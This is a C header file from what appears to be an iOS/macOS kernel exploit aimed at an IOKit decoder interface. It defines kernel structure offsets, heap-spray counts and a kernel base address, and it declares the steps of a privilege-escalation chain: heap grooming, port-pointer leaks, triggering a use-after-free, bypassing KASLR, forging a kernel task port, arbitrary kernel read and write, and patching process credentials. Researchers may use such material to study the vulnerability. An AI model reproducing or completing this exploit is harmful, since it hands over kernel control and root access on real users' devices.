#ifndef HELPER_H
#define HELPER_H

#include <Foundation/Foundation.h>
#include "iokit.h"

#define LOG_LOG(tag, fmt, ...) NSLog((@"[%c] %s:%s: " fmt), tag, __func__, mach_error_string(ret), ##__VA_ARGS__); fflush(stderr)

#ifdef NDEBUG
#define DEBUG_LOG(fmt, ...)
#define ERROR_LOG(fmt, ...)
#else
#define DEBUG_LOG(fmt, ...) LOG_LOG('+', fmt, ##__VA_ARGS__)
#define ERROR_LOG(fmt, ...) LOG_LOG('!', fmt, ##__VA_ARGS__)
#endif /* NDEBUG */

#define LOG_LOG2(tag, fmt, ...) NSLog((@"[%c] %s: " fmt), tag, __func__, ##__VA_ARGS__); fflush(stderr)

#ifdef NDEBUG
#define DEBUG_LOG2(fmt, ...)
#define ERROR_LOG2(fmt, ...)
#else
#define DEBUG_LOG2(fmt, ...) LOG_LOG2('+', fmt, ##__VA_ARGS__)
#define ERROR_LOG2(fmt, ...) LOG_LOG2('!', fmt, ##__VA_ARGS__)
#endif /* NDEBUG */

// 7 * 8 B = 56 B -> Allocation in kalloc.64
#define N_PORTS_LEAK 7

// first three field of struct vm_map_copy allocate 24 bytes
#define SIZEOF_VM_MAP_HEADER 24
#define KALLOC_64 0x40 - SIZEOF_VM_MAP_HEADER
#define KALLOC_4096 0x1000 - SIZEOF_VM_MAP_HEADER

#define IO_BITS_PORT_OFFSET 0x00
#define IO_REFERENCES_PORT_OFFSET 0x04
#define IO_LOCK_TYPE_PORT_OFFSET 0x10
#define IP_RECEIVER_PORT_OFFSET 0x60
#define KOBJECT_PORT_OFFSET 0x68
#define IP_CONTEXT_PORT_OFFSET 0x90
#define IP_SRIGHTS_PORT_OFFSET 0xa0

#define LOCK_TYPE_TASK_OFFSET 0x0b
#define REFCOUNT_TASK_OFFSET 0x10
#define ACTIVE_TASK_OFFSET 0x14
#define VM_MAP_TASK_OFFSET 0x20
#define BSD_INFO_TASK_OFFSET 0x368

#define NEXT_PROC_OFFSET 0x00
#define PREV_PROC_OFFSET 0x08
#define PID_PROC_OFFSET 0x10
#define TASK_PROC_OFFSET 0x18
#define UCRED_PROC_OFFSET 0x100

#define IS_TASK_IPC_SPACE_OFFSET 0x28

#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_CLOCK 25

#define MAGIC_CONSTANT 0xdeadf007
#define KERNEL_BASE 0xfffffff007004000
#define SYSTEM_CLOCK_OFFSET 0x69720

#define N_OSDATA_SPRAY 0x400
#define GET_PREFIX_LENGTH 140

#define NULL_BYTE_HEX "00"
#define CHUNK_SPRAY_SIZE 0x38

#define N_BEFORE_PORTS 0x2800
#define N_AFTER_PORTS 0x1400
#define N_SPRAY_PORTS 60000
#define N_GC_PORTS 0xc8

#define N_PIPES 0x64

#define N_OOL_PORTS_DESCRIPTOR 0x190
#define N_OOL_DESCRIPTOR 0x400

#define SLIDE_CONSTANT 0x100000
#define KERNEL_SLIDE_FOR_INDEX(X) X * SLIDE_CONSTANT

#define ONE_MILLISECOND 1000000

#define KERNEL_PID 0
#define LAUNCHD_PID 1

extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address,
					    mach_vm_size_t size, mach_vm_address_t data,
					    mach_vm_size_t *outsize);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address,
				   vm_offset_t data, mach_msg_type_number_t dataCnt);

int spray_kernel_heap_with_zeroes(io_connect_t *connection, uint32_t *surface_id,
				  char *key);
int spray_kalloc_64_with_port_pointers(io_connect_t *connection, uint32_t *surface_id,
				       uint64_t target_port_pointer, uint64_t own_task_port_pointer,
				       uint64_t host_port_pointer, char *key);
int search_for_pointer_leak(io_connect_t *connection, uint32_t *surface_id,
			    uint64_t *port_pointer, uint64_t *other_pointer,
			    uint64_t *host_pointer);
int create_decoder(io_connect_t *userclient_connection, uint32_t *surface_id);
int trigger_bug(io_connect_t *userclient_connection, uint32_t *surface_id);
int trigger_free(io_connect_t *userclient_connection);
void prepare_pipes(int **pipe_fds);
int prepare_ports(mach_port_t **before_ports, mach_port_t **after_ports,
			    mach_port_t *receive_port, mach_port_t *other_receive_port,
			    mach_port_t *target_port, mach_port_t **spray_ports,
    			    mach_port_t *own_task_port);
int leak_port_pointer(mach_port_t *receive_port, mach_port_t *target_port,
		      mach_port_t *other_port);
int spray_kalloc_64_with_zeroes(mach_port_t **spray_ports);
int spray_kalloc_4096_with_zeroes(mach_port_t **spray_ports);
int spray_kalloc_4096(mach_port_t **spray_ports, mach_port_t *target_pointer,
		      uint64_t port_offset, int *port_number);
uint64_t get_port_offset(uint64_t *port_pointer);
uint64_t get_port_page(uint64_t *port_pointer);
int control_port_via_pipe(int **pipe_fds, uint64_t offset, mach_port_t *port_to_destroy,
			  mach_port_t *target_port, int *pipe_number);
uint64_t break_kaslr_via_clock_port(int read_fd, int write_fd, uint64_t offset, mach_port_t *target_port);
uint64_t get_own_task_pointer(int read_fd, int write_fd, uint64_t port_offset,
			      uint64_t port_address, mach_port_t *target_port);
uint64_t get_kernel_task_pointer(int read_fd, int write_fd, uint64_t port_offset,
				 uint64_t port_address, mach_port_t *target_port);
uint64_t get_kernel_vm_map(int read_fd, int write_fd, uint64_t port_offset,
			   uint64_t port_address, mach_port_t *target_port);
uint64_t get_kernel_ip_receiver(int read_fd, int write_fd, uint64_t port_offset,
				mach_port_t *target_port, uint64_t host_pointer);
int create_kernel_task_port(int read_fd, int write_fd, uint64_t port_offset,
			    uint64_t port_address, mach_port_t *target_port,
			    uint64_t host_pointer);
int patch_credentials(mach_port_t kernel_port, uint64_t port_address, uint64_t *old_credentials);
void patch_known_credentials(mach_port_t kernel_port, uint64_t port_address,
			     uint64_t old_credentials);
int elevate_privileges(mach_port_t kernel_port, uint64_t own_task_pointer);
void clean_controlled_page(int read_fd, int write_fd);
int test_pid_read(int read_fd, int write_fd, uint64_t port_offset, uint64_t kernel_base,
		  mach_port_t target_port);
int test_kernel_read(mach_port_t kernel_port, uint64_t kernel_base);
uint32_t read_32bit(int read_fd, int write_fd, uint64_t port_offset,
		    uint64_t address, mach_port_t *target_port);
uint64_t read_64bit(int read_fd, int write_fd, uint64_t port_offset,
		    uint64_t address, mach_port_t *target_port);
void force_GC();
void force_GC2();
void kernel_read(mach_port_t kernel_port, uint64_t address, void *read_value, size_t size);
uint32_t kernel_read_32bit(mach_port_t kernel_port, uint64_t address);
uint64_t kernel_read_64bit(mach_port_t kernel_port, uint64_t address);
void kernel_write(mach_port_t kernel_port, uint64_t address, void *write_value, size_t size);
void kernel_write_64bit(mach_port_t kernel_port, uint64_t address, uint64_t write_value);
#endif // HELPER_H
